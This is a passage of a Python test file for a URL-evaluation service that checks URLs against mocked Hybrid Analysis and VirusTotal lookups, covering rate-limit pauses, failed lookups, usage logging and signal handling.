    mock_external_apis(http_mock, config)
    body = load_json("ha", "overview_200.json")
    body["verdict"] = "suspicious"
    http_mock.replace(responses.GET, re.compile(f"{config.ha_url}/overview/.+"), json=body)

    evaluator_mod.evaluate_url(URL)

    assert sum(_service(call, config) == "ha" for call in http_mock.calls) == 1


def test_lookup_skipped_while_ha_is_paused(evaluator_mod, http_mock, config, db):
    hybrid_analysis._blocked_until = datetime.now(timezone.utc) + timedelta(minutes=10)  # reset by conftest
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert (evaluator_mod.ha_url_stats["skipped"], evaluator_mod.ha_url_stats["rate_limited"]) == (1, 1)
    assert apis["ha"].call_count == 0 and apis["ha_submit"].call_count == 0


def test_failed_lookup_does_not_break_evaluation(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, body=b"<html>x</html>", content_type="text/html")
    mock_external_apis(http_mock, config, vt_url="url_malicious.json")
    http_mock.replace(responses.GET, re.compile(f"{config.ha_url}/overview/.+"), json={"message": "x"}, status=500)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "malicious"
    assert evaluator_mod.ha_url_stats["failed"] == 1


# --- Main loop helpers ---

def test_ha_usage_window_without_activity_logs_nothing(evaluator_mod, caplog):
    caplog.set_level(logging.INFO, logger="evaluator.py")
    evaluator_mod.ha_stats_started -= 10 * 60

    evaluator_mod._log_ha_usage_if_ha_stats_interval_minutes_reached()

    assert "Hybrid Analysis" not in caplog.text
    assert time.monotonic() - evaluator_mod.ha_stats_started < 60  # a new window starts


def test_ha_usage_warns_on_rate_limit(evaluator_mod, http_mock, config, caplog):
    caplog.set_level(logging.INFO, logger="evaluator.py")
    mock_ha_overview(http_mock, config, status=429)
    hybrid_analysis.lookup_sha256(config, "a" * 64)

    evaluator_mod._log_ha_usage_if_ha_stats_interval_minutes_reached(force=True)

    assert "HTTP 429 (rate limit) received 1x" in caplog.text


def test_sigint_handler_stops_the_main_loop(evaluator_mod):
    evaluator_mod.running_flag = True

    evaluator_mod.sigint_handler(signal.SIGTERM, None)

    assert evaluator_mod.running_flag is False
